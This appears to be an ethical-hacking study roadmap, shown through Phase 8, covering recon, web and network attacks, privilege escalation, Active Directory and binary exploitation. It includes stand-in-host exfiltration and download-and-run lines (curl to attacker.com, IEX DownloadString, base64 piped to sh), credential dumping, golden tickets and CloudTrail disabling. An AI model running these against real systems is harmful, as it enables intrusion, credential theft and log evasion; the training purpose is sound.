# Master Ethical Hacking & Offensive Security Roadmap (Complete 2026 Edition)

A structured, battle-tested, end-to-end roadmap to master **Ethical Hacking, Penetration Testing, Bug Bounty Hunting, and Red Teaming** from foundational networking and scripting to advanced Active Directory exploitation, binary exploitation, and EDR/AV evasion.

---

## Table of Contents
1. [Ethical Mandate & Rules of Engagement](#1-ethical-mandate--rules-of-engagement)
2. [Mastery Definition & Senior Security Consultant Benchmarks](#2-mastery-definition--senior-security-consultant-benchmarks)
3. [Visual End-to-End Attack Lifecycle & Mindmap](#3-visual-end-to-end-attack-lifecycle--mindmap)
4. [Phase 1: Computer Science, Networking & System Fundamentals](#phase-1-computer-science-networking--system-fundamentals)
5. [Phase 2: Attack Surface Discovery, OSINT & Active Reconnaissance](#phase-2-attack-surface-discovery-osint--active-reconnaissance)
6. [Phase 3: Web Application Penetration Testing & API Hacking (OWASP Top 10 Deep Dive)](#phase-3-web-application-penetration-testing--api-hacking-owasp-top-10-deep-dive)
7. [Phase 4: Network Penetration Testing & Infrastructure Exploitation](#phase-4-network-penetration-testing--infrastructure-exploitation)
8. [Phase 5: Privilege Escalation (Linux & Windows Internals)](#phase-5-privilege-escalation-linux--windows-internals)
9. [Phase 6: Active Directory (AD) & Enterprise Domain Exploitation](#phase-6-active-directory-ad--enterprise-domain-exploitation)
10. [Phase 7: Cloud Penetration Testing (AWS, Azure & GCP)](#phase-7-cloud-penetration-testing-aws-azure--gcp)
11. [Phase 8: Binary Exploitation (PWN) & Reverse Engineering](#phase-8-binary-exploitation-pwn--reverse-engineering)
12. [Phase 9: Red Teaming, C2 Infrastructure & EDR/AV Evasion](#phase-9-red-teaming-c2-infrastructure--edrav-evasion)
13. [Phase 10: Bug Bounty Hunting Methodology & High-Payout Targets](#phase-10-bug-bounty-hunting-methodology--high-payout-targets)
14. [Phase 11: Professional Lab Progression (Zero to Hero)](#phase-11-professional-lab-progression-zero-to-hero)
15. [Phase 12: Industry Certification Matrix & Career Trajectory](#phase-12-industry-certification-matrix--career-trajectory)
16. [Phase 13: Professional Reporting, Remediation & Executive Communication](#phase-13-professional-reporting-remediation--executive-communication)

---

## 1. Ethical Mandate & Rules of Engagement

> [!CAUTION]
> **The Hacker's Code & Legal Boundary**: The tools, techniques, and methodologies detailed herein are strictly for authorized penetration testing, vulnerability research, defensive architecture, and educational laboratory practice. Unsolicited probing or exploitation of targets without explicit, written legal authorization (Rules of Engagement / Scope Agreement) violates cybercrime legislation globally (e.g., US CFAA 18 U.S.C. § 1030, UK Computer Misuse Act, Indian IT Act 2000 § 66). Always operate within authorized boundaries.

### The Standard Rules of Engagement (RoE) Matrix
- **In-Scope Targets**: Explicitly defined IP ranges, domains, CIDRs, API endpoints, or user accounts.
- **Out-of-Scope Targets**: Third-party services (e.g., payment gateways, CDN infrastructure), production databases susceptible to disruption, physical premises (unless physical pentest contracted).
- **Prohibited Techniques**: Denial of Service (DoS/DDoS), permanent data deletion, destruction of physical hardware, social engineering out of agreed scope.
- **Immediate Escalation Triggers**: Accidental discovery of plaintext PII/cardholder data, active third-party threat actor presence (compromised box), critical infrastructure impairment.

---

## 2. Mastery Definition & Senior Security Consultant Benchmarks

You have achieved true mastery of Offensive Security when you can:

1. **Move Beyond Automated Scanners**:
   - Manually chain subtle, low-severity flaws (e.g., CORS misconfiguration + CSRF + IDOR) into full account takeover or remote code execution without relying on automated scanners.
2. **Execute Stealthy Active Directory Compromise**:
   - Infiltrate a hardened corporate Active Directory forest from an unprivileged domain-joined workstation to Enterprise Admin purely through credential harvesting, Kerberos ticket manipulation, and ACL abuse without tripping standard alarms.
3. **Deconstruct Memory & Exploit Binaries**:
   - Read disassembled x86/x64 assembly, analyze stack and heap behavior in a debugger, defeat memory protections (DEP/NX, ASLR) via Return-Oriented Programming (ROP), and write custom shellcode.
4. **Bypass Modern Defenses (EDR/AV/WAF)**:
   - Identify detection mechanisms (AMSI, Event Tracing for Windows - ETW, API hooks, heuristic behavioral analysis) and evade them using custom loaders, direct system calls (Syscalls), and payload encryption.
5. **Produce Actionable Executive & Engineering Deliverables**:
   - Translate complex technical exploits into business risk calculations (CVSS v3.1/v4.0, DREAD) and author remediation guides for engineering teams.

---

## 3. Visual End-to-End Attack Lifecycle & Mindmap

```
                               ┌────────────────────────────────┐
                               │  Phase 1: Intelligence / OSINT │
                               │  ASN, Subdomains, Tech Stack,  │
                               │  Employee Profiling, Leaked PWs│
                               └────────────────┬───────────────┘
                                                │
                                                ▼
                               ┌────────────────────────────────┐
                               │ Phase 2: Vulnerability Analysis│
                               │ Nmap, Web Profiling, Attack    │
                               │ Surface Mapping, Service Audit │
                               └────────────────┬───────────────┘
                                                │
                                                ▼
                               ┌────────────────────────────────┐
                               │ Phase 3: Initial Foothold (RCE)│
                               │ Web Exploit, Phishing, Misconf,│
                               │ Unpatched CVE, API Flaw        │
                               └────────────────┬───────────────┘
                                                │
                                                ▼
                               ┌────────────────────────────────┐
                               │ Phase 4: Local Priv Escalation │
                               │ Linux: SUID, Sudo, Kernel, Caps│
                               │ Windows: Tokens, Services, DLLs│
                               └────────────────┬───────────────┘
                                                │
                                                ▼
                               ┌────────────────────────────────┐
                               │ Phase 5: Internal Network & AD │
                               │ BloodHound, Kerberoasting,     │
                               │ Pass-The-Hash, Lateral Movement│
                               └────────────────┬───────────────┘
                                                │
                                                ▼
                               ┌────────────────────────────────┐
                               │ Phase 6: Domain Admin / Pwned  │
                               │ DCSync, Golden Ticket, Cloud   │
                               │ Pivot (AWS/Azure), Data Exfil  │
                               └────────────────────────────────┘
```

---

## Phase 1: Computer Science, Networking & System Fundamentals

Before executing an exploit, you must understand how data traverses the wire and how operating systems manage memory, processes, and permissions.

### 1. Networking Mastery (The Wire)
- **OSI 7-Layer & TCP/IP 4-Layer Models**: Deep-dive packet flow from Layer 2 (Ethernet frame) through Layer 4 (TCP segment / UDP datagram) to Layer 7 (Application payload).
- **Core Protocols Deep Dive**:
  - **TCP**: 3-Way Handshake (`SYN` -> `SYN-ACK` -> `ACK`), 4-Way Teardown (`FIN`/`ACK`), TCP flags (`SYN`, `ACK`, `RST`, `FIN`, `PSH`, `URG`), Window sizing, TCP sequence prediction attacks.
  - **UDP**: Stateless communication, DNS, DHCP, SNMP, amplification vectors.
  - **IP & Routing**: Subnetting (CIDR `/24`, `/16`), NAT (SNAT, DNAT), ARP protocol and ARP cache poisoning / MITM.
  - **DNS**: Recursive vs authoritative resolvers, record types (`A`, `AAAA`, `CNAME`, `MX`, `TXT`, `NS`, `PTR`, `SRV`), Zone Transfers (`AXFR`).
  - **TLS/SSL**: Handshake mechanics, cipher suites, certificate validation, SNI (Server Name Indication), HSTS, SSL stripping.
- **Packet Analysis Tools**:
  - `Wireshark`: Display filters (`ip.addr == x.x.x.x && tcp.port == 443`), stream reassembly, TLS key decryption via `SSLKEYLOGFILE`.
  - `tcpdump`: Raw packet capture CLI commands (`tcpdump -i eth0 -nn -s0 -w capture.pcap 'tcp port 80 or tcp port 443'`).

### 2. Operating System Internals
- **Linux Architecture**:
  - File system hierarchy (`/etc`, `/proc`, `/sys`, `/dev`, `/var/log`).
  - Process management: PID, PPID, UID, GID, EUID (Effective User ID), environment variables.
  - File permissions: Read/Write/Execute (`rwxrwxrwx`), Octal notation (`755`, `644`), Special permissions (SUID `4000`, SGID `2000`, Sticky Bit `1000`).
  - System Calls (`syscalls`): `ptrace`, `mmap`, `execve`, `fork`, `clone`.
  - Kernel & User Space boundary.
- **Windows Internals**:
  - Kernel space vs User space (Ring 0 vs Ring 3).
  - Processes and Threads: Process Environment Block (`PEB`), Thread Environment Block (`TEB`), Virtual Memory allocations.
  - Windows Security Architecture: Security Identifiers (SIDs), Access Tokens (Primary vs Impersonation), Discretionary Access Control Lists (DACLs) and SACLs.
  - Windows Registry: `HKLM`, `HKCU`, `HKCR`, `HKU`, `HKCC`.
  - Subsystems: LSASS (Local Security Authority Subsystem Service), SAM (Security Account Manager), Service Control Manager (SCM).

### 3. Offensive Programming & Scripting
- **Python for Penetration Testers**:
  - Socket programming (custom port scanners, reverse shells).
  - Web scraping & HTTP interaction using `requests`, `urllib3`, and `BeautifulSoup`.
  - Concurrency: `threading`, `asyncio`, `multiprocessing` for brute-force automation.
  - Cryptography & Encoding: `base64`, `hashlib`, `cryptography` libraries.
- **Bash Scripting**:
  - Pipeline processing (`grep`, `awk`, `sed`, `cut`, `sort`, `uniq`, `xargs`).
  - One-liners for mass reconnaissance and parsing logs.
- **PowerShell for Offensive Operations**:
  - Execution policies and bypasses (`powershell -ep bypass`).
  - Cmdlets: `Invoke-WebRequest`, `Get-Process`, `Get-WmiObject` / `Get-CimInstance`.
  - In-memory execution: `IEX (New-Object Net.WebClient).DownloadString('...')`.
- **C / C++ for Exploit Engineering**:
  - Memory pointers, buffer allocations, struct manipulation, direct Win32 API calls (`VirtualAlloc`, `WriteProcessMemory`, `CreateRemoteThread`).

---

## Phase 2: Attack Surface Discovery, OSINT & Active Reconnaissance

Reconnaissance represents 70% of the penetration testing lifecycle. What you can find determines what you can exploit.

### 1. Passive Reconnaissance & OSINT (Zero Contact with Target)
- **Corporate Entity Mapping**:
  - Identifying Autonomous System Numbers (ASN) via `bgp.he.net` and `whois`.
  - IP space discovery: CIDR ranges, acquisitions, subsidiaries.
- **Subdomain Enumeration (Passive)**:
  - Certificate Transparency logs (`crt.sh`, `censys.io`).
  - DNS aggregators: SecurityTrails, Chaos (ProjectDiscovery), VirusTotal.
  - Search engine dorking (Google, DuckDuckGo):
    - `site:target.com filetype:pdf confidential`
    - `site:target.com inurl:admin | inurl:login`
    - `site:target.com ext:env | ext:yml | ext:sql`
- **Asset Search Engines**:
  - **Shodan**: `org:"Target" http.title:"Dashboard"`, `ssl.cert.subject.CN:"*.target.com"`.
  - **Censys**: Querying exposed infrastructure, TLS certificates, open management ports.
  - **FOFA** / **Zoomeye**: Locating specific software versions and exposed IoT/services.
- **Credential & Code Leaks**:
  - GitHub dorking: `target.com password`, `target.com api_key`, `target.com AWS_SECRET_ACCESS_KEY`.
  - Git repository hunting: `TruffleHog`, `Gitleaks` for historical commit secrets.
  - Breach databases: DeHashed, HaveIBeenPwned.

### 2. Active Reconnaissance & Network Mapping
- **DNS Enumeration & Zone Transfers**:
  - `dig axfr @ns1.target.com target.com` (Detecting misconfigured DNS servers).
  - DNS bruteforcing with `dnsx`, `puredns`, `massdns` using wordlists (e.g., `SecLists/Discovery/DNS`).
- **Port Scanning & Host Discovery**:
  - `nmap` Deep Dive:
    ```bash
    # Ultra-fast SYN stealth scan of all ports + service fingerprinting
    nmap -sS -p- -T4 --min-rate 1000 -v -oA target_all_ports target.com
    
    # Detailed scan on discovered open ports with default safe scripts
    nmap -sC -sV -p 22,80,443,8080 -oA target_services target.com
    
    # UDP scan for common critical services (DNS, SNMP, NTP, DHCP)
    nmap -sU -p 53,69,123,161,500 target.com
    ```
  - High-speed scanners: `masscan -p1-65535 target_ip/24 --rate=10000`, `rustscan`.
- **Web Technology Fingerprinting & Directory Fuzzing**:
  - `whatweb`, `wappalyzer-cli` to detect CMS, frameworks, reverse proxies.
  - Directory & virtual host (VHost) fuzzing:
    ```bash
    # High-performance directory brute-forcing
    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
         -u https://target.com/FUZZ -mc 200,204,301,302,307,401,403 -recursion
    
    # Virtual host discovery (Bypassing Cloudflare/CDN origin)
    ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
         -u https://target_ip/ -H "Host: FUZZ.target.com" -fs [filter_default_size]
    ```

---

## Phase 3: Web Application Penetration Testing & API Hacking (OWASP Top 10 Deep Dive)

Web applications represent the most accessible corporate attack surface.

### 1. Interception Proxy Mastery: Burp Suite Pro & Caido
- Configuring upstream proxies, TLS certificate injection on browser/mobile devices.
- Burp Repeater, Intruder (Sniper, Battering Ram, Pitchfork, Cluster Bomb attack types).
- Burp Match & Replace rules for auth token swapping and header manipulation.
- Key Extensions: Turbo Intruder, Autorize (IDOR automation), Param Miner, Logger++.

### 2. Injection Vulnerabilities
- **SQL Injection (SQLi)**:
  - In-Band (Union-based): Finding column count (`ORDER BY 1,2,3...`), finding reflected data types (`UNION SELECT 'a', null, null`).
  - Error-based: Forcing database error messages to reveal data (`extractvalue`, `updatexml` in MySQL).
  - Blind Boolean-based: Testing conditional statements (`AND 1=1` vs `AND 1=2`).
  - Time-based Blind: Injecting sleep primitives (`'; WAITFOR DELAY '0:0:5'--`, `pg_sleep(5)`).
  - Out-of-Band (OAST): Triggering DNS queries (`LOAD_FILE('\\\\attacker.burpcollaborator.net\\test')`).
  - Automated exploitation: `sqlmap -u "http://target.com/page?id=1" --batch --dbs --dump`.
- **Cross-Site Scripting (XSS)**:
  - Reflected, Stored, and DOM-based XSS.
  - Content Security Policy (CSP) analysis and bypasses (JSONP endpoints, unsafe-inline, script gadgets).
  - Weaponization: Session hijacking, credential harvesting modals, CSRF chaining, internal network scanning from the victim's browser.
- **Server-Side Template Injection (SSTI)**:
  - Identifying template engines (Jinja2, Twig, Freemarker, Pebble, Velocity).
  - Probing: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`.
  - Escalating to RCE in Jinja2:
    `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`.
- **Command Injection (RCE)**:
  - Separators: `;`, `&`, `&&`, `|`, `||`, newline `%0a`, backticks, `$()`.
  - Blind out-of-band validation via `curl http://attacker.com/$(whoami)`.
  - Filter evasion: IFS variable (`${IFS}`), base64 decoding pipes (`echo <base64> | base64 -d | sh`).

### 3. Broken Access Control & Authentication
- **Insecure Direct Object References (IDOR)**:
  - Horizontal privilege escalation (User A viewing User B's profile `/api/v1/user/1002`).
  - Vertical privilege escalation (User A accessing admin endpoint `/api/v1/admin/dashboard`).
  - UUID predictability, GUID leakage in public responses.
- **JWT (JSON Web Token) Exploitation**:
  - Algorithm confusion (`"alg": "none"`).
  - HMAC-SHA256 vs RSA public key confusion (Signing with the public key as HMAC secret).
  - Weak secret brute-forcing via `hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt`.
  - Injecting malicious claims (`"role": "admin"`, `"kid"` path traversal).
- **OAuth 2.0 & SSO Vulnerabilities**:
  - Flawed `redirect_uri` validation (open redirect chaining to steal authorization code).
  - CSRF on OAuth callback (`state` parameter omitted or unvalidated).

### 4. Server-Side Request Forgery (SSRF)
- Basic SSRF: Requesting localhost services (`http://127.0.0.1:8080/admin`).
- Cloud Metadata Exfiltration:
  - AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - GCP: `http://metadata.google.internal/computeMetadata/v1/` with `Metadata-Flavor: Google`
  - Azure: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`
- Defense Bypasses:
  - Decimal/Hex IP representations (`http://2130706433` -> `127.0.0.1`).
  - DNS Rebinding attacks.
  - Enclosed alphanumerics & URL parser confusion (`http://attacker.com@127.0.0.1`).

### 5. File Inclusion & Upload Vulnerabilities
- Local File Inclusion (LFI): Directory traversal (`../../../../etc/passwd`), null byte injection, PHP filters (`php://filter/convert.base64-encode/resource=index.php`).
- Remote File Inclusion (RFI): Including external payloads (`http://attacker.com/shell.txt`).
- Malicious File Upload:
  - Bypassing extension filters (Double extensions `.php.jpg`, alternative extensions `.php5`, `.phtml`, `.phar`, `.jspx`).
  - MIME-type manipulation (`Content-Type: image/jpeg`).
  - Magic byte spoofing (Prepending GIF89a;).
  - Zip Slip / Tar Path Traversal.

### 6. Modern API Hacking (REST & GraphQL)
- **GraphQL**:
  - Introspection query enabled (`__schema`).
  - Batching / query amplification DoS.
  - Circular query depth exploitation.
- **REST APIs**:
  - Broken Object Property Level Authorization (Mass Assignment / Parameter Pollution).
  - Lack of rate limiting on password reset / OTP verification.

---

## Phase 4: Network Penetration Testing & Infrastructure Exploitation

Targeting network services, unpatched appliances, firewalls, and operating systems.

### 1. Network Protocol Enumeration & Exploitation
- **SMB (Port 445 / 139)**:
  - Share enumeration: `smbclient -L //target/ -N`, `crackmapexec smb target -u '' -p '' --shares`.
  - Vulnerability checks: MS17-010 (EternalBlue), SambaCry, SMBGhost (CVE-2020-0796).
  - SMB Signing disabled: Relaying NTLM authentication to other machines via `ntlmrelayx.py`.
- **SSH (Port 22)**:
  - Key management, user enumeration exploits, weak key brute-forcing with `hydra`.
- **SNMP (Port 161/162 UDP)**:
  - Brute-forcing community strings (`public`, `private`, `manager`).
  - Extracting network routing tables, installed software, running processes (`snmpwalk -v2c -c public target`).
- **NFS (Port 2049)**:
  - Identifying open exports (`showmount -e target`).
  - Mounting shares (`mount -t nfs target:/share /mnt/nfs`).
  - Escalating privileges via `no_root_squash` misconfigurations.
- **RDP (Port 3389)**:
  - BlueKeep (CVE-2019-0708), NLA bypass techniques, session hijacking via `tscon`.

### 2. Exploitation Frameworks & Metasploit Engineering
- Metasploit Architecture: Modules (Auxiliary, Exploit, Post, Payload, Encoder, NOP).
- Meterpreter: Migration (`migrate`), in-memory payload execution, port forwarding (`portfwd`), pivoting routes (`route add`).
- Custom exploit porting: Finding public exploits on Exploit-DB, GitHub, converting Python 2 POCs to Python 3, compiling raw C exploits.

### 3. Network Pivoting & Port Forwarding
When you compromise a dual-homed machine (accessible externally with an internal network interface), you must pivot into the private subnet.

```
Attacker (Kali) ──[Public IP]──> Dual-Homed Target ──[Private LAN 10.10.10.0/24]──> Internal Target
   (10.11.0.4)                      (10.11.0.50 & 10.10.10.5)                          (10.10.10.20)
```

- **SSH Dynamic Port Forwarding (SOCKS Proxy)**:
  ```bash
  # Open SOCKS5 proxy on attacker port 1080
  ssh -D 1080 -N -f user@dual-homed-target.com
  # Configure /etc/proxychains4.conf with socks5 127.0.0.1 1080
  proxychains nmap -sT -Pn -p 80,445 10.10.10.20
  ```
- **Chisel (TCP Tunneling via HTTP/WebSockets)**:
  ```bash
  # Attacker machine (Server)
  ./chisel server -p 8000 --reverse
  
  # Compromised machine (Client)
  ./chisel client attacker.com:8000 R:socks
  ```
- **Ligolo-ng (Modern TUN Interface Pivoting)**:
  - Creates a virtual TUN adapter on the attacker machine, allowing direct routing (`ip route add 10.10.10.0/24 dev ligolo`) without using proxychains.

---

## Phase 5: Privilege Escalation (Linux & Windows Internals)

Gaining an initial shell (e.g., as `www-data` on Linux or `iis apppool\defaultapppool` on Windows) is only step one. You must elevate to `root` or `NT AUTHORITY\SYSTEM`.

### 1. Linux Privilege Escalation
- **Information Gathering & Automated Enumeration**:
  - `LinPEAS.sh`, `LinEnum.sh`, `unix-privesc-check`.
- **Sudo Misconfigurations**:
  - `sudo -l` inspection.
  - Exploiting binaries using **GTFOBins** (e.g., `sudo vim -c ':!/bin/sh'`, `sudo nmap --interactive`, `sudo env /bin/sh`).
  - `LD_PRELOAD` exploitation when preserved in sudoers (`env_keep += LD_PRELOAD`).
- **SUID / SGID Binaries**:
  - Finding setuid binaries: `find / -perm -u=s -type f 2>/dev/null`.
  - Shared object injection: Running `strace` or `ltrace` to identify missing `.so` libraries in custom SUID binaries.
  - PATH variable hijacking if binary calls system commands without absolute paths (`system("cat file.txt")`).
- **Cron Jobs & Scheduled Tasks**:
  - Writable cron scripts running as root (`/etc/crontab`, `/etc/cron.*`, `/var/spool/cron/crontabs`).
  - Wildcard expansion in tar/rsync (`tar -czf *` -> creating files `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`).
- **Linux Capabilities**:
  - Inspecting capabilities: `getcap -r / 2>/dev/null`.
  - Exploiting `cap_setuid+ep` on python/perl/tar: `/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`.
- **Kernel Exploits**:
  - Identifying kernel release: `uname -a`.
  - Classic exploits: Dirty COW (CVE-2016-5195), PwnKit (CVE-2021-4034), Dirty Cred (CVE-2022-2588), OverlayFS (CVE-2023-0386).

### 2. Windows Privilege Escalation
- **Information Gathering & Automated Enumeration**:
  - `winPEAS.exe`, `Seatbelt.exe`, `PowerUp.ps1`, `JAWS-Enum.ps1`.
- **Service Misconfigurations**:
  - **Unquoted Service Paths**: Services with paths containing spaces without quotes (`C:\Program Files\My App\service.exe` -> placing malicious binary at `C:\Program Files\My.exe`).
  - **Weak Service Permissions**: Modifying the service binary path with `sc config "ServiceName" binPath= "C:\malicious.exe"`.
  - **Weak Registry Permissions**: Hijacking registry keys under `HKLM\SYSTEM\CurrentControlSet\Services`.
- **AlwaysInstallElevated**:
  - Checking registry: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`.
  - If both `HKLM` and `HKCU` are set to `1`, any user can execute `.msi` packages with SYSTEM privileges (`msfvenom -p windows/x64/shell_reverse_tcp ... -f msi`).
- **Token Impersonation & Potato Family**:
  - Checking privileges: `whoami /priv`.
  - If **`SeImpersonatePrivilege`** or **`SeAssignPrimaryTokenPrivilege`** is enabled:
    - **JuicyPotato** (Windows 10 < 1809, Server 2016).
    - **PrintSpoofer** / **PipePotato** (Windows 10, Server 2019).
    - **GodPotato** (Covers all modern versions via DCOM to SYSTEM elevation).
- **Credential Harvesting**:
  - Dumping LSASS memory: `procdump.exe -ma lsass.exe lsass.dmp`, then parsing offline with `pypykatz`.
  - SAM & SYSTEM hives extraction:
    ```cmd
    reg save HKLM\SAM sam.save
    reg save HKLM\SYSTEM system.save
    ```
  - Extracting plaintext credentials or hashes using Mimikatz (`sekurlsa::logonpasswords`).

---

## Phase 6: Active Directory (AD) & Enterprise Domain Exploitation

In enterprise environments, Active Directory is the central identity store and primary target of red teams.

### 1. Active Directory Fundamentals
- Domain Controllers (DC), Global Catalog, Kerberos protocol (KDC, AS, TGS, TGT).
- Group Policy Objects (GPOs), Organizational Units (OUs), Trusts (Forest, External).
- Kerberos Authentication Flow:
  1. Client sends `AS-REQ` (with timestamp encrypted with user password hash).
  2. KDC validates timestamp, returns `AS-REP` containing `TGT` (Ticket Granting Ticket, encrypted with `krbtgt` hash).
  3. Client requests service access via `TGS-REQ` presenting `TGT`.
  4. KDC verifies `TGT`, returns `TGS-REP` containing service ticket (encrypted with service account's password hash).
  5. Client presents Service Ticket to target server in `AP-REQ`.

### 2. Active Directory Reconnaissance & Graph Analysis
- **BloodHound & SharpHound**:
  - Collecting session, group membership, ACL data:
    `SharpHound.exe -c All,NetLocalGroup --zipfilename domain_data.zip`.
  - Ingesting data into BloodHound (Neo4j graph database).
  - Executing graph queries:
    - "Shortest Paths to Domain Admins"
    - "Find Principals with DCSync Rights"
    - "Shortest Path from Kerberoastable Users to High Value Targets"
- **CLI Enumeration**:
  - `PowerView.ps1`: `Get-DomainUser`, `Get-DomainComputer`, `Get-DomainGPO`, `Find-LocalAdminAccess`.
  - `NetExec` (formerly CrackMapExec): `netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt`.

### 3. Kerberos Attacks
- **AS-REP Roasting**:
  - Identifying domain accounts with `Do not require Kerberos preauthentication` flag set (`DONT_REQ_PREAUTH`).
  - Requesting AS-REP without credentials: `impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -format hashcat`.
  - Cracking hashes offline with `hashcat -m 18200`.
- **Kerberoasting**:
  - Requesting Service Tickets (TGS) for accounts with a Service Principal Name (SPN) set (often MSSQL, IIS service accounts).
  - Executing via Impacket: `impacket-GetUserSPNs domain.local/user:password -request`.
  - Cracking ticket hash offline with `hashcat -m 13100`.
- **Overpass-the-Hash / Pass-the-Key**:
  - Requesting a valid Kerberos TGT using an NTLM hash or AES key via Rubeus or Impacket.

### 4. Lateral Movement & Credential Access
- **Pass-the-Hash (PtH)**:
  - Using captured NTLM hashes to authenticate without cracking:
    `impacket-psexec -hashes :<ntlm_hash> Administrator@192.168.1.100`.
- **WMI & WinRM Execution**:
  - `evil-winrm -i 192.168.1.100 -u Administrator -H <ntlm_hash>`.
  - `impacket-wmiexec domain/user:password@target_ip`.
- **DCOM (Distributed Component Object Model)**:
  - Lateral execution via MMC20.Application, ShellWindows, ShellBrowserWindow.

### 5. Domain Dominance & Persistence
- **DCSync Attack**:
  - Simulating replication behavior of a Domain Controller via Directory Replication Service Remote Protocol (MS-DRSR).
  - Requires `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions.
  - Dumping all domain password hashes (including `krbtgt`):
    `impacket-secretsdump domain.local/admin:password@DC01.domain.local`.
- **Golden Ticket**:
  - Forging a valid TGT using the extracted `krbtgt` NTLM/AES hash.
  - Grants unrestricted access as any user (including Domain Admin) for 10 years.
  - Generated via Mimikatz: `kerberos::golden /domain:domain.local /sid:S-1-5-21-... /rc4:<krbtgt_hash> /user:Administrator /ticket:golden.kirbi`.
- **Silver Ticket**:
  - Forging a service ticket (TGS) using the target service account's password hash without contacting the DC.
- **Active Directory Certificate Services (ADCS) Exploitation (SpecterOps Research)**:
  - Exploiting misconfigured certificate templates (ESC1 through ESC8).
  - **ESC1**: Template allows client authentication, enrollee supplies subject alternative name (SAN), no manager approval.
  - Requesting certificates as Domain Admin via `Certify.exe` or `Certipy`.

---

## Phase 7: Cloud Penetration Testing (AWS, Azure & GCP)

Modern hybrid networks integrate cloud infrastructure. Compromising an internal server often leads to cloud identity keys.

### 1. Amazon Web Services (AWS) Pentesting
- **AWS Identity and Access Management (IAM)**:
  - Policies, Roles, Groups, Instance Profiles.
  - IAM Privilege Escalation vectors (e.g., `iam:CreatePolicyVersion`, `iam:SetDefaultPolicyVersion`, `iam:PassRole` + `ec2:RunInstances`).
- **AWS Enumeration & Auditing Tools**:
  - `aws-cli` manual querying (`aws sts get-caller-identity`, `aws s3 ls`, `aws iam list-attached-user-policies`).
  - Automated scanners: `ScoutSuite`, `Prowler`, `CloudQuery`.
  - Exploitation framework: `Pacu` (Rhino Security Labs).
- **S3 Bucket Security**:
  - Publicly accessible buckets, authenticated user write permissions, unauthenticated listing.
- **CloudTrail Evasion**:
  - Disabling trails (`cloudtrail:StopLogging`), deleting trails, modifying S3 bucket lifecycle to delete logs.

### 2. Microsoft Azure & Entra ID (Azure AD)
- Azure AD vs On-Premises AD differences.
- Hybrid Identity: Azure AD Connect, Seamless Single Sign-On (SSO), Password Hash Sync (PHS).
- **Azure Pentesting Tools**:
  - `ROADtools`: Azure AD graph explorer.
  - `MicroBurst`: PowerShell toolkit for Azure penetration testing.
  - `AzureHound`: BloodHound integration for Azure AD paths.
- Azure Privilege Escalation: App Registrations with high Microsoft Graph permissions (`RoleManagement.ReadWrite.Directory`), Managed Identities abuse.

### 3. Google Cloud Platform (GCP) Pentesting
- IAM Roles (Primitive vs Predefined vs Custom), Service Accounts, Service Account Keys (`.json`).
- Service Account impersonation (`iam.serviceAccounts.actAs`).
- Storage buckets (`gsutil ls gs://bucket-name`).
- Tools: `GCPBucketBrute`, `Haymaker`.

---

## Phase 8: Binary Exploitation (PWN) & Reverse Engineering

To find 0-day vulnerabilities and analyze compiled malware, you must master machine code and memory corruption.

### 1. Computer Architecture & Assembly (x86 & x64)
- **Registers**:
  - General Purpose (x64): `RAX` (accumulator/return value), `RBX` (base), `RCX` (counter), `RDX` (data), `RSI` (source), `RDI` (destination), `RBP` (base pointer), `RSP` (stack pointer).
  - Instruction Pointer: `EIP` (32-bit) / `RIP` (64-bit).
  - Calling conventions: `cdecl` (arguments pushed onto stack right-to-left) vs `System V AMD64 ABI` (arguments in `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`).
- **Memory Layout of a Process**:
  ```
  High Memory  [ Kernel Space ]
               [ Stack (grows downwards ↓) ]
               [ Shared Libraries / mmap ]
               [ Heap (grows upwards ↑) ]
               [ BSS (Uninitialized data) ]
               [ Data (Initialized globals) ]
  Low Memory   [ Text (Executable Code) ]
  ```

### 2. Reverse Engineering Tooling
- **Disassemblers & Decompilers**:
  - **Ghidra** (NSA open-source): Headless analysis, decompiler analysis, scripting in Java/Python.
  - **IDA Pro / IDA Free**: Interactive graph view, signature analysis (FLIRT).
  - **Binary Ninja**: Intermediate Representation (IL) analysis.
- **Dynamic Analysis & Debugging**:
  - **GDB** with plugins: **GEF** (GDB Enhanced Features) or **pwndbg**.
  - **x64dbg** on Windows.
  - Breakpoints (software `int 3`, hardware registers `DR0-DR3`), stepping instructions (`si`), examining memory (`x/20wx $esp`).

### 3. Stack-Based Buffer Overflows (Step-by-Step)
1. **Fuzzing**: Finding the crash input length.
2. **Offset Identification**: Generating cyclic patterns (`pattern create 200` in GEF) and finding offset at crash (`pattern search $rsp`).
3. **Overwriting Instruction Pointer (`RIP`/`EIP`)**: Controlling execution flow.
4. **Bad Characters Detection**: Sending all bytes `\x00` through `\xff` to detect truncated characters (e.g., `\x00`, `\x0a`, `\x0d`).
5. **Finding a Jump Point**: Locating `JMP ESP` or `CALL EAX` instruction within an executable memory section lacking ASLR (`jmpcall`).
6. **Payload Construction**: NOP Sled (`\x90` * 32) + Shellcode + Overwritten Return Address.

### 4. Modern Mitigations & Bypass Techniques
- **NX / DEP (No-Execute / Data Execution Prevention)**:
  - Stack memory is non-executable. Shellcode cannot execute on stack.
  - **Bypass**: **Return-Oriented Programming (ROP)**. Chaining small instruction sequences followed by `RET` ("gadgets") already present in executable code to call functions like `mprotect()` or `system("/bin/sh")`.
  - Tooling: `ROPgadget`, `ropper`.
- **ASLR (Address Space Layout Randomization)**:
  - Randomizes base addresses of stack, heap, and libraries (libc).
  - **Bypass**: Information leaks (leaking a function pointer from GOT/PLT to calculate the static offset of `libc_base`).
- **Stack Canaries (Cookies)**:
  - Random value placed right before saved frame pointer (`RBP`) and return address (`RIP`). Verified before returning.
  - **Bypass**: Leaking canary value via format string vulnerability or bruteforcing byte-by-byte (on forking servers).
- **PIE (Position Independent Executable)**:
  - Randomizes the base address of the main executable binary itself.

---

